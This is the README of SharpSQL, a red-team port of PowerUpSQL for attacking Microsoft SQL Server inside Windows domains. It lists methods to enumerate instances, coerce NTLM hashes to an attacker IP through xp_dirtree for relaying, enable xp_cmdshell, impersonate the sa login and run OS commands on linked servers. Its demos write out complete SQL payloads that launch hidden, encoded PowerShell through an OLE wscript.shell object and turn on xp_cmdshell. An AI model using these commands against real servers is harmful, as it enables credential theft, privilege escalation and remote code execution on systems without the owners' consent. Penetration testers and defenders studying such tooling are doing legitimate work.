# SharpSQL

Simple port of PowerUpSQL
- Methods and options are case-insensitive e.g. `Get-SQLInstanceDomain`/`get-sqlinstancedomain` or `-Instance`/`-instance`
- `-Instance` required for all methods except `Get-SQLInstanceDomain`

Thanks to [tevora-threat](https://github.com/tevora-threat) for getting the ball rolling.

## Usage
```
SharpSQL by @mlcsec

Usage:

    SharpSQL.exe [Method] [-Instance <sql.server>] [-LinkedInstance <linked.sql.server>] [-Command <whoami>] [-Query <query>]

Options:

    -Instance                  - The instance to taget
    -db                        - The db to connect to (default: master)
    -LinkedInstance            - The linked instance to target
    -ip                        - The IP to xp_dirtree (share: /pwn)
    -User                      - The user to impersonate
    -Command                   - The command to execute (default: whoami - Invoke-OSCmd, Invoke-LinkedOSCmd, Invoke-ExternalScript, and Invoke-OLEObject)
    -Query                     - The raw SQL query to execute
    -help                      - Show help

Methods:
    Get-SQLInstanceDomain      - Get SQL instances within current domain via user and computer SPNs (no parameters required)
    Get-Databases              - Get available databases
    Get-DBUser                 - Get database user via USER_NAME
    Get-GroupMembership        - Get group member for current user ('guest' or 'sysadmin')
    Get-Hash                   - Get hash via xp_dirtree, works nicely with impacket-ntlmrelayx
    Get-ImpersonableUsers      - Get impersonable users
    Get-LinkedServers          - Get linked SQL servers
    Get-LinkedPrivs            - Get current user privs for linked server
    Get-Sysadmins              - Get sysadmin users
    Get-SystemUser             - Get system user via SYSTEM_USER
    Get-SQLQuery               - Execute raw SQL query
    Get-Triggers               - Get SQL server triggers
    Get-Users                  - Get users from syslogins
    Get-UserPrivs              - Get current user server privileges
    Check-Cmdshell             - Check whether xp_cmdshell is enabled on instance
    Check-LinkedCmdshell       - Check whether xp_cmdshell is enabled on linked server
    Enable-Cmdshell            - Enable xp_cmdshell on instance
    Enable-LinkedCmdshell      - Enable xp_cmdshell on linked server
    Invoke-OSCmd               - Execute system command via_xp_cmdshell on instance
    Invoke-LinkedOSCmd         - Executes system command via xp_cmdshell on linked server
    Invoke-ExternalScript      - Invoke external python script command execution
    Invoke-OLEObject           - Invoke OLE wscript command execution
    Invoke-UserImpersonation   - Impersonate user and execute query
    Invoke-DBOImpersonation    - Impersonate dbo on msdb and execute query

Examples:

    SharpSQL.exe Get-SQLInstanceDomain
    SharpSQL.exe Get-UserPrivs -Instance sql.server
    SharpSQL.exe Get-Sysadmins -Instance sql.server
    SharpSQL.exe Get-LinkedServers -Instance sql.server
    SharpSQL.exe Get-Hash -Instance sql.server -ip 10.10.10.10
    SharpSQL.exe Invoke-OSCmd -Instance sql.server -Command "whoami /all"
    SharpSQL.exe Invoke-LinkedOSCmd -Instance sql.server -LinkedInstance linked.sql.server -Command "dir C:\users\"
```


## Demos and Examples
### Get-GroupMembership
![image](https://user-images.githubusercontent.com/47215311/153180706-78e2a53c-79fb-4db0-ba03-cda16d476966.png)

### Get-SQLquery
![image](https://user-images.githubusercontent.com/47215311/153181678-6d61bb45-ff9b-4451-93ff-9497ab875bc5.png)

### Get-UserPrivs
![image](https://user-images.githubusercontent.com/47215311/153054239-3937a19a-5514-42fb-980c-4e1676f085ca.png)

### Invoke-OSCmd
![image](https://user-images.githubusercontent.com/47215311/153182593-e40747ff-b9f1-4ed4-a634-556f37e617ea.png)

### OLE Object via Impersonation
```
.\SharpSQL.exe invoke-userimpersonation -instance dc01 -user sa -Query "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'powershell -exec bypass -nop -w hidden -enc blahblah';"
```

### Impersonation and xp_cmdshell
```
.\SharpSQL.exe invoke-userimpersonation -instance dc01 -user sa -Query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"

.\SharpSQL.exe invoke-userimpersonation -instance dc01 -user sa -Query "EXEC xp_cmdshell 'whoami'"
```







## Todo

- Test:
    - `Invoke-ExternalScript` - not tested in lab

- Fix:
    - `Enable-LinkedCmdshell` - rpc or metadata error currently, `Check-LinkedCmdshell` and `Invoke-LinkedOSCmd` work fine

- Add:
    - `Invoke-CustomAsm`
    - `Add-User`
    - `Add-LinkedUser`
    - `Enable-RPC` - on instance and linkedinstance, allows for EXEC... AT...
    - double link crawl functionality, raw queries should work as is
